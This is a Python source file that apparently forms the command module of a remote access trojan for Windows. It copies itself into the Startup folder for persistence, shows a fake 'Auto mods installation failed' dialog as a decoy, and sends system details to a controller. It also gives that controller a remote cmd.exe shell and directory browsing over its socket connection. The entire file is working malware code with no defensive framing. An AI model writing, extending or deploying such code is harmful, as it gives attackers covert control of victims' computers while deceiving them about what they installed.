# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    commands.py                                        :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: TheRed <TheRed@students.42.fr>             +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2024/07/22 00:20:32 by TheRed            #+#    #+#              #
#    Updated: 2024/07/22 00:20:32 by TheRed           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import subprocess
import threading
import platform
import psutil
import shutil
import ctypes
import socket
import json
import sys
import os

class Command:
	def __init__(self, client) -> None:
		from client import Client

		self.client:	Client = client

	def command(self, command_name: str, args: list) -> None:
		command_list = dir(self)
		
		if command_name in command_list:
			getattr(self, command_name)(args)

	def persistance(self, args: list) -> None:
		path = os.path.abspath(sys.argv[0])
		print(path)
		
		try:
			shutil.copy(path, os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", os.path.basename(sys.argv[0])))
			self.client.send(json.dumps({"success": True}))
		except Exception as e:
			print(e)
			self.client.send(json.dumps({"success": False}))
		print(args)
		if (args == [1]):
			threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, "Auto mods installation failed", "Auto mods", 5)).start()


	def info(self, args: list) -> None:
		info = {
			"platform": platform.platform(),
			"architecture": platform.architecture(),
			"processor": platform.processor(),
			"name": socket.gethostname(),
			"ram": f"{round(psutil.virtual_memory().used / (1024 ** 3), 2)} / {round(psutil.virtual_memory().total / (1024 ** 3))} GB",
		}
		self.client.send(json.dumps(info))
		
	def shell(self, args: list) -> None:
		shell = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

		def send_output(pipe, client):
			while True:
				output = pipe.read(1)
				if not output:
					break
				client.send(output, encoding=False)

		threading.Thread(target=send_output, args=[shell.stdout, self.client], daemon=True).start()
		threading.Thread(target=send_output, args=(shell.stderr, self.client), daemon=True).start()

		while True:
			try:
				data = self.client.recv()
				if (data == "EXIT"):
					break

				if not data:
					break
				if (not data.endswith("\n")):
					data += "\n"
				shell.stdin.write(data.encode())
				shell.stdin.flush()
			except:
				break
		
		self.client.send("EXIT")
		shell.terminate()

	def cd(self, args: list) -> None:
		path = os.path.expanduser("~")
		if (args[0] != "~"):
			path = args[0]

		payload = None
		if (os.path.exists(path)):
			os.chdir(path)
			payload = {"success": True, "path": os.getcwd()}
		else:
			payload = {"success": False} 

		self.client.send(json.dumps(payload))
	
	def ls(self, args: list) -> None:
		path = os.getcwd()
		if (args[0] != None):
			path = args[0]

		dir_list = os.listdir(path)
		payload = {dir: {"directory": os.path.isdir(dir), "time": os.path.getctime(dir)} for dir in dir_list}
		self.client.send(json.dumps(payload))
	
	def close(self, args: list) -> None:
		print("client closed")
		self.client.close()